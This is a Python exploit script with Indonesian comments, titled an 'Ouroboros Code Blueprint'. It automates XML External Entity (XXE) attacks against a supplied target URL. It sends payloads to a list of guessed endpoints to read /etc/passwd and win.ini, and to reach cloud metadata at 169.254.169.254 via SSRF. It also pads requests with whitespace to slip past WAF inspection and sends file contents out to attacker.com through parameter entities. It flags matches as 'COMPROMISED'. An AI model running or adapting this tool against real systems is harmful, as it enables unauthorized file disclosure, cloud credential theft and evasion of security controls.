"""
Ouroboros Code Blueprint: XXE (XML External Entity Injection)
=============================================================
Kategori : XXE - Local File Disclosure & SSRF via XML Parser
Tingkat  : Advanced
Teknik   : Padding bypass, OOB exfiltration, Content-Type confusion, encoding
"""

def run_exploit(target_url):
    """
    Blueprint XXE untuk membaca file lokal atau memicu SSRF via parser XML.
    Sesuaikan `xml_endpoints` dengan endpoint target yang memproses XML.
    """
    import requests
    import re

    session = requests.Session()

    # -------------------------------------------------------------------
    # Daftar XXE payload dengan berbagai teknik bypass
    # -------------------------------------------------------------------

    # Payload 1: Classic XXE - Baca file /etc/passwd
    payload_classic = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>"""

    # Payload 2: Padding bypass - dorong payload melewati buffer WAF (8KB)
    padding = " " * 9000  # Padding 9KB, melewati inspeksi WAF
    payload_padded = f"""<?xml version="1.0" encoding="UTF-8"?>
<!-- {padding} -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>"""

    # Payload 3: Parameter Entity (bypass filter &xxe;)
    payload_param_entity = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
  %eval;
  %exfil;
]>
<root><data>test</data></root>"""

    # Payload 4: Windows file path (jika target Windows)
    payload_windows = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]>
<root><data>&xxe;</data></root>"""

    # Payload 5: SSRF via XXE - akses internal resource
    payload_ssrf = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root><data>&xxe;</data></root>"""

    # Payload 6: PHP Filter via XXE
    payload_php_filter = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
<root><data>&xxe;</data></root>"""

    all_payloads = [
        ("Classic XXE", payload_classic, "text/xml"),
        ("Padded XXE (WAF Bypass)", payload_padded, "text/xml"),
        ("SSRF via XXE", payload_ssrf, "text/xml"),
        ("PHP Filter XXE", payload_php_filter, "application/xml"),
        ("Windows XXE", payload_windows, "application/xml"),
    ]

    # Endpoint yang mungkin memproses XML
    xml_endpoints = [
        f"{target_url}/api/import",
        f"{target_url}/api/upload",
        f"{target_url}/xml",
        f"{target_url}/soap",
        f"{target_url}/api/data",
        f"{target_url}/feed",
        f"{target_url}/rss",
        f"{target_url}/sitemap.xml",
    ]

    try:
        for endpoint in xml_endpoints:
            for name, payload, ctype in all_payloads:
                try:
                    headers = {"Content-Type": ctype}
                    r = session.post(endpoint, data=payload.encode('utf-8'),
                                    headers=headers, timeout=8)

                    # Deteksi keberhasilan
                    if any(kw in r.text for kw in [
                        "root:x:0:0", "/bin/bash", "/bin/sh",  # Linux /etc/passwd
                        "[extensions]", "win.ini",               # Windows
                        "ami-id", "instance-id",                 # AWS metadata
                    ]):
                        return {
                            "status": "COMPROMISED",
                            "details": f"XXE '{name}' berhasil di {endpoint}! Konten: {r.text[:400]}"
                        }

                    # Deteksi base64 response (PHP filter)
                    if "cm9vdDp4OjA6MD" in r.text:  # "root:x:0:0" in base64
                        import base64
                        decoded = base64.b64decode(r.text.strip()).decode("utf-8", errors="replace")
                        return {
                            "status": "COMPROMISED",
                            "details": f"XXE PHP Filter berhasil. Decoded: {decoded[:300]}"
                        }

                except Exception:
                    continue

        # Coba Content-Type Confusion: kirim XML dengan header non-XML
        for endpoint in xml_endpoints[:3]:
            try:
                confusion_headers = {"Content-Type": "text/plain"}
                r = session.post(endpoint, data=payload_classic.encode(),
                                headers=confusion_headers, timeout=8)
                if "root:x:0:0" in r.text:
                    return {
                        "status": "COMPROMISED",
                        "details": f"XXE Content-Type Confusion berhasil di {endpoint}!"
                    }
            except Exception:
                continue

        return {"status": "FAILED", "details": "Tidak ada endpoint XXE yang rentan ditemukan."}

    except Exception as e:
        return {"status": "FAILED", "details": f"Exception: {str(e)}"}
